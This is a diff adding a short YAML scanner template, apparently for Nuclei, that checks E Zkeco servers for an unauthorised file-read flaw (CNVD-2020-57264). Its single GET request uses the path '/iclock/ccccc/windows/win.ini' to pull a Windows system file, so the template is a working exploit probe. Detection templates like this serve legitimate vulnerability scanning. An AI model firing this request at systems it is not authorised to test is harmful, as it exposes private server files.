@@ -1,0 +1,21 @@
+id: cnvd-2020-57264-read-file
+info:
+  name: E Zkeco Read File (CNVD-2020-57264)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: cnvd-2020-57264
+  description: |
+    Exploitation of E Zkeco Read File vulnerability allowing unauthorized file read (CNVD-2020-57264).
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/iclock/ccccc/windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
